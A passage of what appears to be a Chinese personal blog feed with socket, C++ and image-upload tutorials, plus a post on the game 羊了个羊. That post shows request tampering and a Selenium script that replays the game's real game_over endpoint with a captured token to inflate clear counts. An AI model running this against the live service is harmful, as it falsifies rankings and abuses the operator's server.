class="hljs-string">&#x27;启动socket服务，等待客户端连接...&#x27;</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:     <span class="hljs-comment"># 一个死循环，不断的接受客户端发来的连接请求</span><br>    conn, address = sk.accept()  <span class="hljs-comment"># 等待连接，此处自动阻塞</span><br>    <span class="hljs-comment"># 每当有新的连接过来，自动创建一个新的线程，</span><br>    <span class="hljs-comment"># 并将连接对象和访问者的ip信息作为参数传递给线程的执行函数</span><br>    t = threading.Thread(target=link_handler, args=(conn, address))<br>    t.start() <span class="hljs-comment"># 一个死循环，不断的接受客户端发来的连接请求</span><br></code></pre></td></tr></table></figure><h3 id="服务器端">服务器端</h3><p>服务器端的编写也是比较简单的，我们只需要创建一个循环，使其一直监听对应的端口，看看是否有程序进行链接，并作出相应处理即可</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> socket<br><br>ip_port = (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">9999</span>)<br><br>sk = socket.socket()            <span class="hljs-comment"># 创建套接字</span><br>sk.bind(ip_port)                <span class="hljs-comment"># 绑定服务地址</span><br>sk.listen(<span class="hljs-number">5</span>)                    <span class="hljs-comment"># 监听连接请求</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;启动socket服务，等待客户端连接...&#x27;</span>)<br>conn, address = sk.accept()     <span class="hljs-comment"># 等待连接，此处自动阻塞</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:     <span class="hljs-comment"># 一个死循环，直到客户端发送‘exit’的信号，才关闭连接</span><br>    client_data = conn.recv(<span class="hljs-number">1024</span>).decode()      <span class="hljs-comment"># 接收信息</span><br>    <span class="hljs-keyword">if</span> client_data == <span class="hljs-string">&quot;exit&quot;</span>:       <span class="hljs-comment"># 判断是否退出连接</span><br>        exit(<span class="hljs-string">&quot;通信结束&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;来自%s的客户端向你发来信息：%s&quot;</span> % (address, client_data))<br>    conn.sendall(<span class="hljs-string">&#x27;服务器已经收到你的信息&#x27;</span>.encode())    <span class="hljs-comment"># 回馈信息给客户端</span><br>conn.close()    <span class="hljs-comment"># 关闭连接</span><br></code></pre></td></tr></table></figure><h2 id="简单创建-——-UDP模式">简单创建 —— UDP模式</h2><p>相对TCP编程，UDP编程就简单多了，当然可靠性和安全性也差很多。由于UDP没有握手和挥手的过程，因此accept()和connect()方法都不需要。下面是一个简单的例子：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># 服务端</span><br><span class="hljs-keyword">import</span> socket<br>ip_port = (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">8080</span>)<br>sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, <span class="hljs-number">0</span>) <span class="hljs-comment"># 需要在此处进行设置为UDP模式</span><br>sk.bind(ip_port)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    data = sk.recv(<span class="hljs-number">1024</span>).strip().decode()<br>    <span class="hljs-built_in">print</span>(data)<br>    <span class="hljs-keyword">if</span> data == <span class="hljs-string">&quot;exit&quot;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;客户端主动断开连接！&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><br>sk.close()<br><br><span class="hljs-comment"># --------------------------------- #</span><br><span class="hljs-comment"># 客户端</span><br><span class="hljs-keyword">import</span> socket<br>ip_port = (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">8080</span>)<br><br>sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, <span class="hljs-number">0</span>) <span class="hljs-comment"># 需要在此处进行设置为UDP模式</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    inp = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;发送的消息：&#x27;</span>).strip()<br>    sk.sendto(inp.encode(), ip_port)<br>    <span class="hljs-keyword">if</span> inp == <span class="hljs-string">&#x27;exit&#x27;</span>:<br>        <span class="hljs-keyword">break</span><br><br>sk.close()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Programming</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>羊了个羊 —— 分析与刷分测试</title>
    <link href="/2022/09/20/%E7%BE%8A%E4%BA%86%E4%B8%AA%E7%BE%8A/"/>
    <url>/2022/09/20/%E7%BE%8A%E4%BA%86%E4%B8%AA%E7%BE%8A/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>最近，《羊了个羊》刷爆朋友圈。众多玩家里，有人玩到凌晨熬红双眼，有人功亏一篑怒气值拉满，有人苦心钻研破解攻略，有人已默默背熟广告台词…还有人通过游戏参透人生——牌面很复杂，困难一层又一层，槽位只有那几个，但谁都不想这么算了。</p><p>本来对这个游戏毫无了解，但是架不住朋友疯狂裂变式传播，也算是大致了解了一下游戏。</p><p>《羊了个羊》是一款闯关消除小游戏，通关率不到<code>0.1%</code>。玩法是在重叠的各类方块中，找到三个同样图案置于下方卡槽即可消除，卡槽内最多可以储存 7 张卡牌。游戏首页还设置了玩家排行榜，将不同地域的玩家分区进行排行，游戏通关后可进入地区榜单，助力地区排名。</p><p>但是关卡的设计难度比较的不合理，第一关与第二关的难度完全是两个难度等级…属于是刚让玩家学会算术就开始写高数难度的题目…</p><p>这里放几张游戏的图：</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="https://s2.loli.net/2022/09/20/6ryZsKHleWOQmt8.png" alt=""></div><div class="group-image-wrap"><img src="https://s2.loli.net/2022/09/20/w1hOkVItJsxPXjZ.png" alt=""></div><div class="group-image-wrap"><img src="https://s2.loli.net/2022/09/20/KVUAsILC7nM86NO.png" alt=""></div></div><div class="group-image-row"></div></div><h2 id="为什么火-？">为什么火 ？</h2><h3 id="裂变传播">裂变传播</h3><p>前有<code>PDD</code>疯狂转发帮忙“砍一刀”，今有羊羊席卷朋友圈。</p><p>还是熟悉的套路，<code>PDD</code>的传播方式无非就是人的贪欲，真以为有天大的好事，白送你几百元。不过也不是不太可能，当代互联网时代下的各大厂商们获新的成本越来越高，通过用户自发的拉新，从而节省一些拉新成本也是常规操作了…</p><p>羊内设置了两个游戏关卡，第一关不加以任何的引导操作，让用户自己去摸索，当用户明白了游戏的目的是三消时，第二关的折磨便接踵而至。因为第二关的难度十分的离谱，因此我们可以看到作者贴心的在下面设置了三种道具，但是每次使用是需要发送给好友的，也就是将游戏进行推广，让用户裂变式的传播。</p><p>或许这也是为什么短时间内这一款游戏能够被大家所接触到，玩到的很大一部分原因。</p><h3 id="第二关的高难度">第二关的高难度</h3><p>本来正常的游戏难度是逐级递增的，依次来提升玩家在不同关卡完成后的喜悦。而当代互联网是快节奏的，用户的都是上厕所时等零碎时间，导致的用户留存率难以保证，因此反其道而行之，干脆提升难度，打算赚一笔就跑。通过难的一个噱头来吸引用户，让用户来进行挑战。</p><h3 id="三消">三消</h3><p>游戏的简单易上手，在玩家的零碎时间不需要动太多的“脑子”就可以玩的一个小游戏，没有众多游戏复杂且麻烦的特点。</p><h3 id="排名导致的虚荣心">排名导致的虚荣心</h3><p>一个简单的小游戏却有两个排名，朋友圈与地区。争强好胜或许是每一个人多多少少都会有的心理，而羊也抓住了用户的这一点心理，通过排名，告诉你这个游戏是有解的，朋友圈里谁谁通关了，通关了<code>XX</code>次。所在地区排名多少等等。这些无非是吸引着用户去不断地尝试，为自己能在朋友圈内秀出一张自己通关的照片，为自己所在的地区能够排上前几名…</p><h2 id="游戏特点">游戏特点</h2><p>对于此类游戏更多的像是一种动物繁衍上的<code>R策略</code>，通过短小的、低成本的试错方式去撞互联网的爆款，随后快速通过流量变现，随后跑路。从远古时期的<code>跳一跳</code>到<code>合成大西瓜</code>再到今天的羊，或许多多少少都是一种试错的方式来获取用户，增加用户留存时间。</p><p>也不难看到随着我们使用的软件的更新，原本单纯的购物平台如：<code>某多多</code>、<code>某宝</code>、<code>某东</code>等软件都增加了短视频，小游戏的功能。也为的就是增加用户的留存率，留存时间。</p><blockquote><p>或许这个就是国内软件特色，把软件越做越大，没用的功能越来越多…</p></blockquote><h2 id="变现方式">变现方式</h2><p>当一款游戏爆火了后，出品方第一时间想到的必然是如何流量变现。羊也不例外。起初获取先压榨用户的社交价值，将游戏裂变传播后获取到巨大的用户量，随后便是压榨用户的广告加载，前面我们提到过了羊的第二关难度的不合理性。因此开发商将用户获取道具的方式由拉人头变成了看广告，在巨大的用户流量体系下赚钱也是轻轻松松…</p><h2 id="刷分测试">刷分测试</h2><p>论这个游戏如何被破解的…我想或许是因为开发的过于简单了，我们对网络请求链接进行抓包，可以发现通信的数据十分简单…</p><p>然后某宝上面也出现了一堆刷分上分的店铺，月销还不少…赚了好多米…</p><blockquote><p>什么时候我也可以赚这么多…</p></blockquote><img src="https://s2.loli.net/2022/09/20/qCIh7c48DdFPb6Z.png" style="zoom: 67%;" /><h3 id="测试环境">测试环境</h3><p>测试时间：2022/09/17</p><p>本次测试使用微信<code>3.4.5.27</code>于<code>Windows</code>下，<code>Fiddler</code>完成对应抓包</p><p><img src="https://s2.loli.net/2022/09/20/uM65tYxzgXhSbki.png" alt=""></p><p>我们通过抓包可以发现地图数据是明文存储的，我们可以获取到许多游戏服务器地址信息</p><p><img src="https://s2.loli.net/2022/09/20/17CI2qTpGuOFQZ9.png" alt=""></p><p>对应的地图数据：</p><p>简单的观察一下，我们可以得知<code>80001</code>为第一关，<code>90015</code>为第二关</p><p><img src="https://s2.loli.net/2022/09/20/AGkXVntDrQiZ7sB.png" alt=""></p><p>对此我们可以修改请求，将两个关卡的请求均替换为第一关，随后进行发送。我们便只需要完成两个第一关即可通过。</p><p>或者我们快速结束游戏我们可以看到对应通过<code>Get</code>方式请求了一个接口，我们将其请求数据进行获取即可得到对应通关的接口，我们对其进行发包处理，便可以不断增加通关次数</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="https://s2.loli.net/2022/09/20/qtTHzcGmdiSy4N1.png" alt=""></div><div class="group-image-wrap"><img src="https://s2.loli.net/2022/09/20/7JPy4XmqfRSQdKo.png" alt=""></div></div></div><p>发包脚本：</p><p>此脚本需要抓取微信登陆小程序时的<code>t</code>参数，之后安装对应依赖后执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br>option = webdriver.ChromeOptions()<br>option.add_argument(<span class="hljs-string">&#x27;headless&#x27;</span>)<br>web = webdriver.Chrome(chrome_options=option)<br>url = <span class="hljs-string">&#x27;https://cat-match.easygame2021.com/sheep/v1/game/game_over?rank_score=1&amp;rank_state=1&amp;rank_time=731&amp;rank_role=1&amp;skin=1&amp;t=&#x27;</span><br>t = <span class="hljs-string">&quot;&quot;</span> <span class="hljs-comment"># 需要 t 参数</span><br>url = url + t<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connecting ...&quot;</span>)<br>web.get(url)<br>times = <span class="hljs-number">100</span> <span class="hljs-comment"># 通关次数</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(times),desc=<span class="hljs-string">&quot;Processing&quot;</span>):<br>    time.sleep(<span class="hljs-number">0.2</span>)<br>    web.refresh()<br><br>web.close()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Success&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="后记">后记</h2><p>本来打算17号当天写完这个后，进行上传的，结果因为学校课程等各种杂事比较多，没能及时上传…</p><p>后续看这个🐏的时候好像又更新了，地图是从一个<code>txt</code>文件中进行读取，然后将地图数据进行<code>md5</code>，具体后续的破解方式我也没怎么看了…</p><p>学校课真是多啊…</p><h2 id="参考链接">参考链接</h2><p>央视网：<a href="https://news.cctv.com/2022/09/19/ARTIzMy9oxer04kixPe4IPGq220919.shtml">羊了个羊易上手通关难致评价褒贬不一 官方回应争议</a></p><p>B站：<a href="https://www.bilibili.com/video/BV1Qd4y167JB?vd_source=7e542cd595a18ecd80a56eb1779810cb">羊了个羊，根本就不是一款游戏【商业B面&amp;牛顿】</a></p>]]></content>
    
    
    <categories>
      
      <category>Others</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>图床自动上传脚本创建</title>
    <link href="/2022/09/12/%E5%9B%BE%E5%BA%8A%E8%84%9A%E6%9C%AC%E5%88%9B%E5%BB%BA/"/>
    <url>/2022/09/12/%E5%9B%BE%E5%BA%8A%E8%84%9A%E6%9C%AC%E5%88%9B%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>不知道什么时候开始平时经常使用的<code>sm.ms</code>图床网站突然就被墙了，怎么登都上不去…然后恰巧本人魔法上网莫名的也崩了，<code>30G</code>的流量一点都用不出去，两者似乎达成了莫名的<code>Combo</code>，让我想要上传图片写个人博客变得困难起来了。起初在泥电某群内遇到一个<code>QQ图床</code>，但是发现不能上传<code>Hexo</code>，最后幸运的是在好朋友的帮助下找到了<code>sm.ms</code>的一个备用链接<code>smms.app</code>,同时也注意到了上传图片的限制，一次性传的图片有限制，恰巧该图床网站提供了一个<code>API</code>接口使用，因此便诞生了此文</p><h2 id="QQ-图床创建">QQ 图床创建</h2><h3 id="失败原因猜测">失败原因猜测</h3><p><code>QQ图床</code>似乎是<code>QQ</code>内发送的图会被保存到服务器上，然后通过<code>QQ</code>类软件可以进行访问，但是上传到<code>Hexo</code>时会因为<code>Referer</code>的来源不是本地或者是<code>QQ</code>类产品而导致无法浏览</p><h3 id="构建方式">构建方式</h3><p><code>QQ图床</code>主要构造十分简单，只需要在<code>QQ</code>上发送一张图片，那么就会生成对应的<code>Url</code>满足下面规则：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//g</span>chat.qpic.cn<span class="hljs-regexp">/gchatpic_new/</span><span class="hljs-number">0</span><span class="hljs-regexp">/530077417-0-&lt;你的md5&gt;/</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>此处的<code>MD5</code>为我们发送的图片的<code>MD5</code>值，需要注意的是<code>MD5</code>中的字母需要全部大写，构造完毕后我们即可进行访问</p><h3 id="构建脚本">构建脚本</h3><p>此处采用<code>Python</code>来完成我们的<code>Url</code>生成，该脚本会扫描当前目录下的图片(<code>.png</code>、<code>.jpg</code>)，然后按照上面规则进行产生<code>Url</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><br><br>path = sys.argv[<span class="hljs-number">0</span>]<br>path = os.path.dirname(path)<br><span class="hljs-comment"># print(path)</span><br>files = os.listdir(path)<br><br><span class="hljs-comment"># print(files)</span><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> files:<br>    png = re.search(<span class="hljs-string">&quot;.png&quot;</span>,i)<br>    jpg = re.search(<span class="hljs-string">&quot;.jpg&quot;</span>,i)<br>    <span class="hljs-keyword">if</span> png != <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> jpg != <span class="hljs-literal">None</span>:<br>        flag = <span class="hljs-number">1</span><br>        file_name = path + <span class="hljs-string">&#x27;\\&#x27;</span> +i<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;文件名称: &quot;</span>,file_name)<br><br>        data = <span class="hljs-built_in">open</span>(file_name,<span class="hljs-string">&quot;rb&quot;</span>).read()<br>        after_md5 = hashlib.md5(data).hexdigest()<br>        after_md5 = after_md5.encode()<br><br>        change_md5 = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(after_md5)):<br>            <span class="hljs-keyword">if</span> after_md5[i] &gt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;a&quot;</span>) <span class="hljs-keyword">and</span> after_md5[i] &lt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;z&quot;</span>):<br>                change_md5 += <span class="hljs-built_in">chr</span>(after_md5[i] - <span class="hljs-number">32</span>)<br>            <span class="hljs-keyword">else</span>:<br>                change_md5 += <span class="hljs-built_in">chr</span>(after_md5[i])<br><br>        url = <span class="hljs-string">f&quot;http://gchat.qpic.cn/gchatpic_new/0/530077417-0-<span class="hljs-subst">&#123;change_md5&#125;</span>/0&quot;</span><br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;对应外链: &quot;</span>,url,<span class="hljs-string">&quot;\n&quot;</span>)<br><br><span class="hljs-keyword">if</span> flag == <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;当前目录没有图片 ~&quot;</span>)<br><br>os.system(<span class="hljs-string">&quot;pause&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="SM-MS-图床创建"><a href="http://SM.MS">SM.MS</a> 图床创建</h2><p>与<code>QQ图床</code>不同<code>SM.MS</code>已经给我们提供了对应的<code>API</code>，我们可以直接使用<code>Python</code>的<code>requests</code>库进行发送请求即可</p><blockquote><p>API文档链接 : <a href="https://doc.sm.ms/">https://doc.sm.ms/</a></p></blockquote><h3 id="构建脚本-2">构建脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> unicodedata <span class="hljs-keyword">import</span> name<br><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Get_API_Token</span>(<span class="hljs-params">UserName,PassWord</span>):</span><br>    data = &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>: UserName,<br>        <span class="hljs-string">&quot;password&quot;</span>: PassWord,<br>    &#125;<br>    url = <span class="hljs-string">&quot;https://smms.app/api/v2/token&quot;</span><br>    res = requests.post(data=data,url=url)<br>    res = res.json()<br>    state = res[<span class="hljs-string">&#x27;success&#x27;</span>]<br>    <span class="hljs-keyword">if</span> state == <span class="hljs-literal">True</span>:<br>        token = res[<span class="hljs-string">&#x27;data&#x27;</span>][<span class="hljs-string">&#x27;token&#x27;</span>]<br>        <span class="hljs-keyword">return</span> token<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;账号或密码有误 ~&quot;</span>)<br>        os.system(<span class="hljs-string">&quot;pause&quot;</span>)<br>        exit(<span class="hljs-number">0</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Upload_Pic</span>(<span class="hljs-params">UserName,PassWord</span>):</span><br>    path = sys.argv[<span class="hljs-number">0</span>]<br>    path = os.path.dirname(path)<br>    files = os.listdir(path)<br>    flag = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> files:<br>        png = re.search(<span class="hljs-string">&quot;.png&quot;</span>,i)<br>        jpg = re.search(<span class="hljs-string">&quot;.jpg&quot;</span>,i)<br>        jpeg = re.search(<span class="hljs-string">&quot;.jpeg&quot;</span>,i)<br>        <span class="hljs-keyword">if</span> png != <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> jpg != <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> jpeg != <span class="hljs-literal">None</span>:<br>            flag = <span class="hljs-number">1</span><br>            file_name = path + <span class="hljs-string">&#x27;\\&#x27;</span> +i<br>            <br><br>            token = Get_API_Token(UserName,PassWord)<br>            headers = &#123;<br>                <span class="hljs-string">&#x27;Authorization&#x27;</span>: token,<br>            &#125;<br>            files = &#123;<br>                <span class="hljs-string">&#x27;smfile&#x27;</span>:<span class="hljs-built_in">open</span>(file_name,<span class="hljs-string">&quot;rb&quot;</span>)<br>            &#125;<br>            url = <span class="hljs-string">&quot;https://smms.app/api/v2/upload&quot;</span><br>            res = requests.post(url=url,files=files,headers=headers).json()<br>            state = res[<span class="hljs-string">&#x27;success&#x27;</span>]<br>            <span class="hljs-keyword">if</span> state == <span class="hljs-literal">True</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;图片名称: &quot;</span>,res[<span class="hljs-string">&#x27;data&#x27;</span>][<span class="hljs-string">&#x27;filename&#x27;</span>])<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;图片路径: &quot;</span>,file_name)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;外链链接: &quot;</span>,res[<span class="hljs-string">&#x27;data&#x27;</span>][<span class="hljs-string">&#x27;url&#x27;</span>])<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;删除链接: &quot;</span>,res[<span class="hljs-string">&#x27;data&#x27;</span>][<span class="hljs-string">&#x27;delete&#x27;</span>])<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;图片名称: &quot;</span>,i)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;图片路径: &quot;</span>,file_name)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;图片上传失败啦 ~&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>                <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-keyword">if</span> flag == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;当前目录下没有图片 ~&quot;</span>)           <br>        os.system(<span class="hljs-string">&quot;pause&quot;</span>)<br>        exit(<span class="hljs-number">0</span>)<br><br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    UserName =<span class="hljs-string">&quot;&quot;</span> <span class="hljs-comment"># 输入账号的地方</span><br>    PassWord =<span class="hljs-string">&quot;&quot;</span> <span class="hljs-comment"># 输入密码的地方</span><br>    Upload_Pic(UserName,PassWord)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Others</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>C++ 核心编程</title>
    <link href="/2022/09/11/C++%20%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/"/>
    <url>/2022/09/11/C++%20%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="堆空间开辟地址-———-new">堆空间开辟地址 ——— new</h2><h3 id="开辟空间">开辟空间</h3><p>我们利用<code>new</code>可以在堆区开辟空间，堆区由程序员进行管控，可以手动进行管理数据存放内存的释放与否，若不写释放过程，则堆区数据会在程序结束时由<code>OS</code>自动释放</p><p>开辟空间形式：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">new</span> <span class="hljs-built_in"><span class="hljs-keyword">int</span></span>(<span class="hljs-number">10</span>) <span class="hljs-comment">// 在堆上开辟了一个 int 类型的数据，new 返回的是对应数据类型的一个指针，括号内为其对应的值</span><br></code></pre></td></tr></table></figure><p>如果我们想要访问该堆空间的数据我们可以创建一个对应数据类型的一个指针</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">int</span>* p = <span class="hljs-keyword">new</span> <span class="hljs-built_in"><span class="hljs-keyword">int</span></span>(<span class="hljs-number">10</span>); <span class="hljs-comment">// 堆上地址保存数据在 p 中</span><br>cout &lt;&lt; *p &lt;&lt; endl;  <span class="hljs-comment">// 10</span><br></code></pre></td></tr></table></figure><p>如果我们想要在堆上创建一个数组或者字符串呢？</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">10</span>]<span class="hljs-comment">// 在堆上开辟了一个 int 类型的数组，括号内为其对应的元素个数</span><br></code></pre></td></tr></table></figure><p>同样的我们需要创建一个指针变量对其进行保存</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">int</span>* arr = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">10</span>]; <span class="hljs-comment">// 堆上地址保存数据在 p 中,返回数组的首地址</span><br></code></pre></td></tr></table></figure><h3 id="释放空间">释放空间</h3><p>我们学会了如何开辟空间后，那如何进行删除对应堆空间的数据呢？这个时候我们将会用到<code>delete</code></p><p>对于不为字符串指针的我们可以直接按下面方式进行删除：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">delete</span> p;<span class="hljs-comment">// p 为指向对应堆空间的一个指针</span><br></code></pre></td></tr></table></figure><p>加入是一个字符串我们需要额外加上一个中括号：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">delete</span>[] arr;<span 